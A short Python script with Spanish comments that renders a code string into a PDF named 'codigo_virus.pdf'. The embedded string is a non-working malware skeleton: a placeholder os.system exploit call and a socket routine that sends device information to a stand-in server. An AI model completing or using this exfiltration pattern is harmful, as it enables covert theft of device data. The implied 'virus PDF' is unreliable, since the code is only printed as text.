from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas

def create_pdf(output_filename, code_content):
    c = canvas.Canvas(output_filename, pagesize=letter)
    width, height = letter

    # Establecer el tamaño de la fuente y el margen
    c.setFont("Helvetica", 10)
    text_object = c.beginText(40, height - 40)
    text_object.setCharSpace(1.2)

    # Añadir el contenido del código al PDF
    for line in code_content.split('\n'):
        text_object.textLine(line)

    c.drawText(text_object)
    c.showPage()
    c.save()

# Código a exportar
code_content = """
import os
import socket

def exploit_vulnerability():
    # Ejemplo de explotación de una vulnerabilidad en PDF
    os.system('command_to_exploit')

def send_data_to_server(data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('tu_servidor', 12345))
    s.sendall(data)
    s.close()

def main():
    exploit_vulnerability()
    device_info = "Información del dispositivo"
    send_data_to_server(device_info.encode())

if __name__ == "__main__":
    main()
"""

# Crear el PDF
create_pdf("codigo_virus.pdf", code_content)